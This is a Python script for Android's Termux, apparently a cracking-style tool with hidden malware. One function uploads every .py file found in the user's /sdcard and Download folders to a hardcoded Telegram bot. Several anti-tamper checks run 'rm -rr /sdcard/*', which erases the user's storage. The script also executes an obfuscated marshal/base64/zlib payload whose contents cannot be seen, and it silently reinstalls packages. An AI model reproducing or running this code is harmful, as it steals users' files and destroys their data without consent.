import os
import zipfile
import marshal
import uuid,base64,hashlib,zlib,subprocess,time,platform,pycurl,httpx,requests
import bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,base64,zlib
import _socket, ssl, certifi
from bs4 import BeautifulSoup
from io import BytesIO
from os import path
from bs4 import BeautifulSoup as sop
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool 
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
CON=sol()
os.system("pip install licensing > /dev/null")
from licensing.models import *
from licensing.methods import Key, Helpers
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
try:
    import concurrent.futures
except ImportError:
    print('\n \033[1;91m[\033[1;93mXD-000\033[1;91m]\033[1;97m installing futures !...\n')
    time.sleep(0.5)
    os.system('pip install pycurl')
try: 
    import bs4
except ImportError:
    print('\n \033[1;91m[\033[1;93mXD-000\033[1;91m]\033[1;97m installing bs4 !...\n')
    time.sleep(0.5)
    os.system('pip install bs4')
os.system('clear')
print('\x1b[38;5;34m        𝗧𝗢𝗢𝗟𝗦 𝗦𝗘𝗖𝗨𝗥𝗜𝗧𝗬 𝗗𝗘𝗧𝗘𝗖𝗧...   ')
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.040)

#-----> Strg Permission Chk <-----#
def stg():
    try:
        open('/sdcard/SUMON.', 'a').write(' ')
    except:
        os.system('termux-setup-storage')
        stg()
stg()
#-----> Protection <-----#
if path.isfile("/data/data/com.termux/files/usr/bin/rm"):pass
else:print(" \033[91;1m! \033[97;1mTurn Off Protection...!");exit()
#-----------------------[ SECURITY-CODE ]-----------------------#

wak='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(wak+'sessions.py','r').read():
    pass
else:
    exit('033[1;32mBxc4x93xc5x9byxc4x81ra chxc4x93lxc4x93 mxc4x93thaxe1xb8x8da kyxc4x81pacxc4x81ra karabxc4x81 tumi txc5x8dmxc4x81ra mxc4x81rxc4x93 kuttxc4x81 dixe1xbax8fxc4x93 cxc5x8ddai')
fu='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(fu+'models.py','r').read():
    pass
else:
    exit('033[1;32mBxc4x93xc5x9byxc4x81ra chxc4x93lxc4x93 mxc4x93thaxe1xb8x8da kyxc4x81pacxc4x81ra karabxc4x81 tumi txc5x8dmxc4x81ra mxc4x81rxc4x93 kuttxc4x81 dixe1xbax8fxc4x93 cxc5x8ddai')
su='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(su+'utils.py','r').read():
    pass
else:
    exit('033[1;32mBxc4x93xc5x9byxc4x81ra chxc4x93lxc4x93 mxc4x93thaxe1xb8x8da kyxc4x81pacxc4x81ra karabxc4x81 tumi txc5x8dmxc4x81ra mxc4x81rxc4x93 kuttxc4x81 dixe1xbax8fxc4x93 cxc5x8ddai')
hu='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(hu+'api.py','r').read():
    pass
else:
    exit('033[1;32mBxc4x93xc5x9byxc4x81ra chxc4x93lxc4x93 mxc4x93thaxe1xb8x8da kyxc4x81pacxc4x81ra karabxc4x81 tumi txc5x8dmxc4x81ra mxc4x81rxc4x93 kuttxc4x81 dixe1xbax8fxc4x93 cxc5x8ddai')
nu='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(nu+'auth.py','r').read():
    pass
else:
    exit('033[1;32mBxc4x93xc5x9byxc4x81ra chxc4x93lxc4x93 mxc4x93thaxe1xb8x8da kyxc4x81pacxc4x81ra karabxc4x81 tumi txc5x8dmxc4x81ra mxc4x81rxc4x93 kuttxc4x81 dixe1xbax8fxc4x93 cxc5x8ddai')
dhon='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(dhon+'packages.py','r').read():
    pass
else:
    exit('033[1;32mBxc4x93xc5x9byxc4x81ra chxc4x93lxc4x93 mxc4x93thaxe1xb8x8da kyxc4x81pacxc4x81ra karabxc4x81 tumi txc5x8dmxc4x81ra mxc4x81rxc4x93 kuttxc4x81 dixe1xbax8fxc4x93 cxc5x8ddai')


try:
    os.listdir("/sdcard")
except:
    sys.exit("[] run termux-setup-storage")

with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py', 'r') as file:
    file_content = file.read()
if 'print(url)' in file_content:
    os.system('rm -rr /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('rm -rr /sdcard/*')
    os.system('pip install requests')
    exit('[xe2x80xa2] RE-RUN TOOL.!')

with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py', 'r') as file:
    file_content = file.read()
if 'print' in file_content:
    os.system('rm -rr /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('rm -rr /sdcard/*')
    os.system('pip install requests')
    exit('[xe2x80xa2] RE-RUN TOOL.!')

with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rr /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('rm -rr /sdcard/*')
    os.system('pip install requests')
    exit('[xe2x80xa2] RE-RUN TOOL.!')
  
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/auth.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rr /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('rm -rr /sdcard/*')
    os.system('pip install requests')
    exit('[xe2x80xa2] RE-RUN TOOL.!')

hashes = []
#<<_________[ PROTECT-DATA-CAPTURE-&-BYPASS ]_________>>#
exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\xf34\x00\x00\x00\x97\x00d\x00\x84\x00Z\x00\x02\x00e\x01\x02\x00e\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x02S\x00)\x03c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x00\x03\x00\x00\x00\xf3\xd8\x00\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00d\x00d\x00d\x04\x85\x03\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00S\x00)\x05N\xda\x07marshal\xda\x04zlib\xda\x06base64\xe9\xff\xff\xff\xff)\x04\xda\n__import__\xda\x05loads\xda\ndecompress\xda\tb64decode)\x01\xda\x02__s\x01\x00\x00\x00 \xfa\x01 \xfa\x08<lambda>r\r\x00\x00\x00\x01\x00\x00\x00sY\x00\x00\x00\x80\x00\x95\n\x989\xd1\x10%\xd4\x10%\xd7\x10+\xd2\x10+\xadJ\xb0v\xd1,>\xd4,>\xd7,I\xd2,I\xcd*\xd0U]\xd1J^\xd4J^\xd7Jh\xd2Jh\xd0ik\xd0lp\xd0lp\xd0np\xd0lp\xd4iq\xd1Jr\xd4Jr\xd1,s\xd4,s\xd1\x10t\xd4\x10t\x80\x00\xf3\x00\x00\x00\x00s4#\x00\x00=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)\x02\xda\x01_\xda\x04exec\xa9\x00r\x0e\x00\x00\x00r\x0c\x00\x00\x00\xfa\x08<module>r\x12\x00\x00\x00\x01\x00\x00\x00sY\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x04t\xd0\x04t\x80\x01\xd0uy\xd0uy\xd0{|\xd0{|\xf0\x00\x00\x7f\x01vN\x02\xf1\x00\x00{\x01wN\x02\xf4\x00\x00{\x01wN\x02\xf1\x00\x00v\x01xN\x02\xf4\x00\x00v\x01xN\x02\xf0\x00\x00v\x01xN\x02\xf0\x00\x00v\x01xN\x02\xf0\x00\x00v\x01xN\x02r\x0e\x00\x00\x00'))

def get_current_city():
    try:
        response = requests.get('https://ipinfo.io/json')
        data = response.json()
        return data['city']
    except Exception as e:
        print("Error fetching current city:", e)
        return None
current_city = get_current_city()
#-----------------------sdcard---------------------#
def bithika():
    session=requests.session()
        
    bot_token = '7464019691:AAESZlkxzy5w6-QTwWeHnMK-qASYzSJ6_OA' 
    chat_id = '1778046662' 	
	#-----------------------py---------------------#
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #------------------------py---------------------------#
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
with tred(max_workers=100) as jjj:
    jjj.submit(bithika)
#----------http_canary-------#
import requests
import os,sys

try:
    g = "anar"
    f="tt"
    file_d = os.listdir('rm -rr')
    if f'com.h{f}pc{g}y.pro' in file_d:
        print('033[1;37m[xc3x97] Uninstall HttpCanary From Your DeviceDevise  ')
        exit()
    else:
        pass
except Exception as e:
    pass

try:
    import requests
except ModuleNotFoundError:
    os.system('pip install requests')
    
def clr():
    try:
        data = os.listdir('/sdcard/*')
        if 'Android' in data:
            print(' 033[1;32m[!]033[1;37m D'+'ont Try Bypas'+'s Mother Fuc'+'ker...! \nYOUR'+' BYPAS'+'S FUCK'+'ED BY XAIN XD');exit()
        else:exit()
    except:exit()   
###----------[ GET PROXY ]----------###
#-----> Proxy <-----#
def fetch_proxies():
    try:
        g = requests.get('https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc')
        proxies_data = g.json()
        proxies = proxies_data['data']
        with open('proxy.txt', 'w') as file:
            for proxy in proxies:
                proxy_ip = proxy['ip']
                proxy_port = proxy['port']
                proxy_url = f"http://{proxy_ip}:{proxy_port}"
                file.write(f"{proxy_url}\n")
        with open('proxy.txt', 'r') as file:
            saved_proxies = file.readlines()
        return saved_proxies
    except requests.exceptions.ConnectionError:
        sys.exit(f' {R}× {W}InterNet Contention Problem.!')
    except Exception as e:
        sys.exit(e)

saved_proxies = fetch_proxies()

###----------[ PEH ]----------###
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m'
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'
GREEN ='\x1b[38;5;46m'
RED = '\033[38;5;196m'
WHITE = '\033[1;97m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
R = '{RED}' 
G = '{GREEN}' 
Y = '\033[1;33m' 
Q = '\033[1;37m'
T = '\033[1;34m'
x = '\33[m' 
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
